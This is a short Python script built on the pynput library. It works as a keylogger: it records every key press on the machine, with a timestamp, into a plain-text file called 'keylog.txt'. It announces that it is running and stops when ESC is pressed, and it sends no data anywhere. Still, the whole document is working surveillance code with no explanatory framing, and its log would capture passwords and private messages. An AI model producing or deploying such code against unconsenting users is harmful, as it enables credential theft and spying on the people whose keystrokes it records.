from pynput import keyboard

import datetime

#specify the log file path
log_file = "keylog.txt"

def log_keystroke(key):
    """Log the keystroke with a timestamp to a file."""
    with open(log_file,"a") as f:
        timestamp = datetime.datetime.now().strftime('%d-%m-%Y %H:%M:%S')
        if hasattr(key, 'char') and key.char is not None:
            f.write(f"{timestamp} - {key.char}\n")
        else:
            f.write(f"{timestamp} -  [{key}]\n")

def on_press(key):
    """Callback function for key press events."""
    log_keystroke(key)

def on_release(key):
    """callback function for key release events."""
    if key == keyboard.Key.esc:
        return False # to stop the listening on ESC key
    
# Set up and start the keyboard listener

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    print("Keylogger is running.... Press ESC to stop.")
    listener.join()